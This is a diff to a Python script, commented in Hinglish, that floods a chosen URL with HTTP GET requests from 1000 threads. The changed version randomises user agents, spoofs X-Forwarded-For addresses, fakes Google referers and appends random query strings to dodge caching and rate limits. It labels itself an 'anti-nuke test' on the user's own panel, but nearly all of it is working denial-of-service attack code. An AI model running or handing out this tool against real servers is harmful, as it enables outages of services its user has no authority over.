@@ -1,54 +1,50 @@
-import threading
-import requests
-import time
-import random
+import threading, requests, random, string, time
 
-TARGET_URL = "http://yourserver.com"  # Apne server ka URL/IP daalo
-THREADS = 400                     # Zyada threads for more load
-REQUESTS_PER_THREAD = 50          # Zyada requests per thread
-DELAY_BETWEEN_REQUESTS = 0.01     # Kam delay, matlab fast requests
+TARGET_URL = "http://yourpanel.com"  # 👈 Tumhara panel URL ya IP
+THREADS = 1000                       # Heavy threads
+REQUESTS_PER_THREAD = 100
+DELAY = 0.001                        # Super fast
 
-USER_AGENTS = [
+user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-    "Mozilla/5.0 (X11; Linux x86_64)",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
+    "Mozilla/5.0 (Linux; Android 10)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+    "curl/7.68.0",
+    "Wget/1.21.1"
 ]
 
-def send_requests(thread_id):
-    success_count = 0
+def generate_random_path():
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))
+
+def attack(thread_id):
     for i in range(REQUESTS_PER_THREAD):
         headers = {
-            "User-Agent": random.choice(USER_AGENTS),
+            "User-Agent": random.choice(user_agents),
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+            "Referer": f"https://google.com/{generate_random_path()}",
             "Accept": "*/*",
-            "Cache-Control": "no-cache",
-            "Pragma": "no-cache",
+            "Connection": "keep-alive"
         }
+
         try:
-            resp = requests.get(TARGET_URL, headers=headers, timeout=5)
-            if resp.status_code == 200:
-                success_count += 1
-            print(f"Thread-{thread_id} Req-{i+1}: Status {resp.status_code}")
-        except requests.exceptions.RequestException as e:
-            print(f"Thread-{thread_id} Req-{i+1}: Failed - {e}")
-        time.sleep(DELAY_BETWEEN_REQUESTS)
-    print(f"Thread-{thread_id} done, successful: {success_count}")
+            url = f"{TARGET_URL}?r={generate_random_path()}"
+            response = requests.get(url, headers=headers, timeout=5)
+            print(f"[T{thread_id}] ✅ {response.status_code}")
+        except Exception as e:
+            print(f"[T{thread_id}] ❌ Error: {e}")
+
+        time.sleep(DELAY)
 
 def main():
-    print(f"Starting powerful attack simulation on {TARGET_URL} with {THREADS} threads...")
+    print(f"🚀 Starting anti-nuke test on {TARGET_URL} with {THREADS} threads")
     threads = []
-    start_time = time.time()
-
     for t_id in range(THREADS):
-        t = threading.Thread(target=send_requests, args=(t_id,))
+        t = threading.Thread(target=attack, args=(t_id,))
         threads.append(t)
         t.start()
-
     for t in threads:
         t.join()
-
-    print(f"Powerful attack simulation completed in {time.time() - start_time:.2f} seconds.")
+    print("✅ Test complete.")
 
 if __name__ == "__main__":
     main()
-    
